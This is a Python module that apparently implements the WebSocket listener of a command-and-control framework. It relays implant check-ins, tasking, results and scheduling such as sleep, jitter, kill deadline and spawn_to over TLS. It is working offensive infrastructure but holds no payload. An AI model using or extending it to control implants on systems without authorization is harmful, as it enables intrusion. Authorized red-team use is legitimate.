"""WebSocket transport.

A single WebSocket message carries the same JSON body the HTTP
transport carries. The three verbs are distinguished by a "verb"
field in the outer message envelope:

    {"verb": "beacon",  "body": <check-in JSON>}
    {"verb": "tasks",   "body": null}
    {"verb": "results", "body": <result JSON>}

The listener reuses the HTTP listener's `_checkin`, `_tasks`,
`_results`, `_unwrap`, and `_wrap` methods verbatim by running
each request through the same Flask app. Only the carriage
differs.

Sessions are still cookie-based. The cookie is returned in the
first WebSocket frame after a check-in and echoed in every
subsequent frame's envelope. A WebSocket connection has no
Cookie header the way HTTP does, so the session token travels
inside the JSON envelope instead.

The listener does not use `simple-websocket`. That library
assumes it is running under a WSGI server that hands it an
unparsed socket; matching that assumption on top of
`socketserver` requires a synthetic environ that has to satisfy
internal library expectations (HTTP_SEC_WEBSOCKET_VERSION,
HTTP_SEC_WEBSOCKET_KEY, and others) which change between
library versions. The minimal RFC 6455 implementation below is
self-contained: the handshake is read from the socket directly,
text and binary frames are supported, ping and pong are
answered, and close is handled with a proper close frame. The
C2 protocol uses one text frame per message and never
fragments, so the small subset implemented here covers every
frame the Go client produces.
"""

from __future__ import annotations

import base64
import hashlib
import json
import logging
import threading
from typing import Optional

from ..listener import BeaconListener

log = logging.getLogger(__name__)


# ---------------------------------------------------------------------
# Minimal RFC 6455 server
#
# Supported:    text frames (0x1), binary frames (0x2),
#               ping (0x9), pong (0xA), close (0x8)
# Not supported: fragmentation, extensions, subprotocols
#
# The unsupported features are not reachable from the shipped
# Go client. coder/websocket sends one unfragmented text frame
# per message and does not request permessage-deflate by
# default.

_WS_GUID = b'258EAFA5-E914-47DA-95CA-C5AB0DC85B11'
_WS_MAX_FRAME = 32 * 1024 * 1024        # 32 MiB per frame
_WS_RECV_TIMEOUT = 120.0                # seconds
_WS_HANDSHAKE_MAX = 16384               # bytes of request head


class _WSConn:
    """A raw socket with a read-ahead buffer.

    The handshake reader may consume more bytes than the HTTP
    request head needs — a client that pipelines its first frame
    immediately after the handshake will have those frame bytes
    land in the same recv() as the trailing CRLF. `leftover`
    carries those surplus bytes into the frame reader so no
    early bytes are lost.
    """

    def __init__(self, sock, leftover: bytes = b''):
        self.sock = sock
        self.buf = bytearray(leftover)

    def read_exact(self, n: int) -> bytes:
        while len(self.buf) < n:
            self.sock.settimeout(_WS_RECV_TIMEOUT)
            chunk = self.sock.recv(max(4096, n - len(self.buf)))
            if not chunk:
                raise ConnectionError('peer closed')
            self.buf.extend(chunk)
        out = bytes(self.buf[:n])
        del self.buf[:n]
        return out

    def write(self, data: bytes) -> None:
        self.sock.settimeout(_WS_RECV_TIMEOUT)
        self.sock.sendall(data)


def _ws_handshake(sock):
    """Perform the server side of the RFC 6455 handshake.

    Returns (path, _WSConn). Raises on any handshake error.
    """
    buf = b''
    while b'\r\n\r\n' not in buf:
        chunk = sock.recv(4096)
        if not chunk:
            raise ConnectionError('peer closed during handshake')
        buf += chunk
        if len(buf) > _WS_HANDSHAKE_MAX:
            raise ValueError('handshake head too large')

    head, _, leftover = buf.partition(b'\r\n\r\n')
    lines = head.split(b'\r\n')
    if not lines:
        raise ValueError('empty request')

    parts = lines[0].split(b' ')
    if len(parts) != 3:
        raise ValueError('malformed request line')
    method, path, _version = parts
    if method != b'GET':
        raise ValueError('method is not GET')
    path = path.decode('latin-1')

    headers = {}
    for line in lines[1:]:
        name, sep, value = line.partition(b':')
        if not sep:
            continue
        headers[name.decode('latin-1').strip().lower()] = (
            value.decode('latin-1').strip())

    if headers.get('upgrade', '').lower() != 'websocket':
        raise ValueError('Upgrade header is not websocket')
    if 'upgrade' not in headers.get('connection', '').lower():
        raise ValueError(
            'Connection header does not include upgrade')

    key = headers.get('sec-websocket-key', '')
    if not key:
        raise ValueError('missing Sec-WebSocket-Key')

    version = headers.get('sec-websocket-version', '')
    if version != '13':
        raise ValueError(
            f'unsupported Sec-WebSocket-Version: {version!r}')

    accept = base64.b64encode(
        hashlib.sha1(key.encode('ascii') + _WS_GUID).digest()
    ).decode('ascii')

    response = (
        'HTTP/1.1 101 Switching Protocols\r\n'
        'Upgrade: websocket\r\n'
        'Connection: Upgrade\r\n'
        f'Sec-WebSocket-Accept: {accept}\r\n'
        '\r\n'
    ).encode('ascii')

    sock.sendall(response)
    return path, _WSConn(sock, leftover)


def _ws_read_frame(conn: _WSConn):
    """Read one frame. Returns (opcode, payload_bytes)."""
    header = conn.read_exact(2)
    b0 = header[0]
    b1 = header[1]
    fin = (b0 & 0x80) != 0
    opcode = b0 & 0x0f
    masked = (b1 & 0x80) != 0
    length = b1 & 0x7f

    if length == 126:
        length = int.from_bytes(conn.read_exact(2), 'big')
    elif length == 127:
        length = int.from_bytes(conn.read_exact(8), 'big')

    if length > _WS_MAX_FRAME:
        raise ValueError(f'frame too large: {length}')

    if not masked:
        # Client-to-server frames must be masked (RFC 6455 §5.1).
        raise ValueError('client frame is not masked')

    mask = conn.read_exact(4)
    payload = conn.read_exact(length)
    unmasked = bytes(
        b ^ mask[i % 4] for i, b in enumerate(payload))

    if not fin:
        raise ValueError('fragmented frames are not supported')

    return opcode, unmasked


def _ws_write_frame(conn: _WSConn, opcode: int,
                    payload: bytes) -> None:
    """Write one unmasked frame. Server-to-client frames are
    never masked (RFC 6455 §5.1)."""
    b0 = 0x80 | (opcode & 0x0f)
    length = len(payload)
    if length < 126:
        header = bytes([b0, length])
    elif length < 65536:
        header = bytes([b0, 126]) + length.to_bytes(2, 'big')
    else:
        header = bytes([b0, 127]) + length.to_bytes(8, 'big')
    conn.write(header + payload)


def _ws_write_close(conn: _WSConn, code: int,
                    reason: str = '') -> None:
    payload = code.to_bytes(2, 'big') + reason.encode('utf-8')
    _ws_write_frame(conn, 0x8, payload)


# ---------------------------------------------------------------------
# Listener class


class WebSocketListener(BeaconListener):

    name = 'websocket'

    def __init__(self, engine, host: str, port: int,
                 certfile: str, keyfile: str,
                 client_ca: str = None,
                 extra_paths: dict = None,
                 c2_profile_dir: str = None,
                 profile_filter: str = None,
                 **kwargs):
        super().__init__(
            engine, host, port, certfile, keyfile,
            client_ca=client_ca,
            extra_paths=extra_paths,
            c2_profile_dir=c2_profile_dir,
            profile_filter=profile_filter)

    # ------------------------------------------------------------------
    # WebSocket message handler

    def handle_ws_message(self, ws, raw: str, peer_ip: str,
                          ws_path: str = None):
        """Handle one WebSocket message. Returns the reply as a
        JSON-serializable object, or None to close the socket.

        The envelope shape mirrors the HTTP requests:
            {"verb": "beacon",  "body": {...}}
            {"verb": "tasks",   "body": null}
            {"verb": "results", "body": {...}}

        The response shape mirrors the HTTP responses:
            {"body": <response JSON>, "error": null}

        A cookie is returned in the first reply and echoed back by
        the client in every subsequent envelope.

        `ws_path` is the path the WebSocket handshake arrived on.
        The Go transport opens a fresh WebSocket per verb with the
        profile path as the handshake path, so ws_path is exactly
        the profile route for this message. It is passed through
        to the Flask request context so the per-path options
        (cookie name, status codes, shaping) resolve to the
        profile that owns the path.
        """
        try:
            msg = json.loads(raw)
        except ValueError:
            return {'error': 'malformed envelope'}

        verb = msg.get('verb', '')
        body = msg.get('body')
        cookie = msg.get('cookie', '')

        if verb not in ('beacon', 'tasks', 'results'):
            return {'error': 'unknown verb'}

        default_path = {
            'beacon':  '/beacon',
            'tasks':   '/tasks',
            'results': '/results',
        }[verb]
        path = default_path
        if ws_path and ws_path in self._path_options:
            path = ws_path

        opts = self._options_for_path(path)
        cname = opts['cookie_name']

        headers = {
            'Content-Type': 'application/json',
            'X-ECDH-Pubkey': msg.get('epk', '') or '',
        }
        if cookie:
            headers['Cookie'] = cname + '=' + cookie
        if msg.get('child_fp'):
            headers['X-Relay-Child'] = msg['child_fp']

        method = 'POST' if verb in ('beacon', 'results') else 'GET'

        try:
            with self._app.test_request_context(
                    path=path,
                    method=method,
                    headers=headers,
                    data=json.dumps(body) if body is not None else None,
                    base_url='https://ws.local',
                    environ_base={
                        'REMOTE_ADDR': peer_ip,
                        'TORNADO_WS': True,
                    }):
                resp = self._app.full_dispatch_request()
        except Exception as exc:
            log.warning("ws: dispatch failed: %s", exc)
            return {'error': 'internal error'}

        expected = opts['status_codes'].get(verb, 200)

        if resp.status_code != expected and resp.status_code >= 400:
            return {'error': 'status %d' % resp.status_code}

        raw_body = resp.get_data()
        if not raw_body:
            reply = None
        else:
            try:
                reply = json.loads(raw_body.decode('utf-8'))
            except (ValueError, UnicodeDecodeError):
                return {'error': 'bad response encoding'}

        scheduling = {}
        for hdr, key in (
                ('X-Beacon-Sleep',     'sleep'),
                ('X-Beacon-Jitter',    'jitter'),
                ('X-Beacon-Kill',      'kill_deadline'),
                ('X-Beacon-WorkStart', 'work_start'),
                ('X-Beacon-WorkEnd',   'work_end'),
                ('X-Beacon-SpawnTo',   'spawn_to')):
            v = resp.headers.get(hdr, '')
            if v:
                scheduling[key] = v

        envelope = {'body': reply, 'error': None}
        if scheduling:
            envelope['scheduling'] = scheduling

        set_cookie = resp.headers.get('Set-Cookie', '')
        prefix = cname + '='
        if set_cookie.startswith(prefix):
            envelope['cookie'] = set_cookie.split(';', 1)[0][
                len(prefix):]

        return envelope


# ---------------------------------------------------------------------
# Raw WebSocket server


class WebSocketServer:
    """Raw WebSocket server. Runs alongside the Flask listener.

    Uses socketserver.ThreadingTCPServer so each WebSocket
    connection runs on its own thread. The listening socket is
    wrapped in TLS once, at bind time, so every accepted
    connection is already a TLS socket when Handler.handle runs.

    The handshake and framing are done in this file — see the
    RFC 6455 helpers above. No third-party WebSocket library is
    involved.
    """

    def __init__(self, listener: WebSocketListener):
        self.listener = listener
        self._thread: Optional[threading.Thread] = None
        self._server = None
        self._ready: threading.Event = threading.Event()
        self._bind_ok = False

    def start(self) -> bool:
        self._ready = threading.Event()
        self._bind_ok = False
        self._thread = threading.Thread(
            target=self._run, daemon=True)
        self._thread.start()
        self._ready.wait(timeout=5.0)
        return self._bind_ok

    def _run(self):
        import ssl
        import socketserver

        port = getattr(self.listener, 'ws_port', None) \
            or self.listener.port
        bind = getattr(self.listener, 'ws_host', None) \
            or self.listener.host

        listener = self.listener

        class Handler(socketserver.BaseRequestHandler):
            def handle(self):
                conn = self.request
                addr = self.client_address
                peer_ip = addr[0] if addr else '0.0.0.0'

                log.debug("ws: connection from %s", peer_ip)

                try:
                    path, ws = _ws_handshake(conn)
                except Exception as exc:
                    log.warning("ws: handshake failed from %s: %s",
                                peer_ip, exc)
                    return

                log.debug("ws: handshake ok from %s path=%r",
                          peer_ip, path)

                accept = set(listener._path_options.keys()) | {'/ws'}
                if path not in accept:
                    log.warning(
                        "ws: rejecting unregistered path %r "
                        "from %s", path, peer_ip)
                    try:
                        _ws_write_close(ws, 1008,
                                        'path not registered')
                    except Exception:
                        pass
                    return

                try:
                    while True:
                        opcode, payload = _ws_read_frame(ws)

                        if opcode == 0x8:            # close
                            break
                        if opcode == 0x9:            # ping
                            _ws_write_frame(ws, 0xA, payload)
                            continue
                        if opcode == 0xA:            # pong
                            continue
                        if opcode in (0x1, 0x2):     # text or binary
                            try:
                                raw = payload.decode('utf-8')
                            except UnicodeDecodeError:
                                raw = payload.decode('latin-1')
                            reply = listener.handle_ws_message(
                                ws, raw, peer_ip, ws_path=path)
                            if reply is None:
                                break
                            _ws_write_frame(
                                ws, 0x1,
                                json.dumps(reply).encode('utf-8'))
                            continue

                        raise ValueError(
                            f'unsupported opcode: {opcode}')

                except Exception as exc:
                    log.warning("ws: session error from %s: %s",
                                peer_ip, exc)
                finally:
                    try:
                        _ws_write_close(ws, 1000, '')
                    except Exception:
                        pass

        class Server(socketserver.ThreadingTCPServer):
            allow_reuse_address = True
            daemon_threads = True

        try:
            srv = Server((bind, port), Handler)
        except OSError as exc:
            log.error("websocket: bind %s:%d: %s",
                      bind, port, exc)
            self._ready.set()
            return

        if listener.certfile and listener.keyfile:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(
                listener.certfile, listener.keyfile)
            if listener.client_ca:
                ctx.verify_mode = ssl.CERT_REQUIRED
                ctx.check_hostname = False
                ctx.load_verify_locations(
                    cafile=listener.client_ca)
            srv.socket = ctx.wrap_socket(
                srv.socket, server_side=True)

        self._server = srv
        self._bind_ok = True
        self._ready.set()
        log.info("websocket: listening on %s:%d", bind, port)
        srv.serve_forever()

    def stop(self) -> None:
        """Shut the WebSocket server down.

        Called during handler shutdown — the dead-man's switch,
        Ctrl-C, a systemctl stop. Without this, the WebSocket
        listener thread keeps running even after every other
        transport has stopped.

        The shutdown call must run on a thread other than the
        one that called serve_forever, or it deadlocks; the
        inner daemon thread does the shutdown and the outer
        thread joins the serve loop.
        """
        if self._server is not None:
            threading.Thread(
                target=self._server.shutdown,
                daemon=True).start()
        if self._thread is not None:
            self._thread.join(timeout=5.0)
            self._thread = None
        self._server = None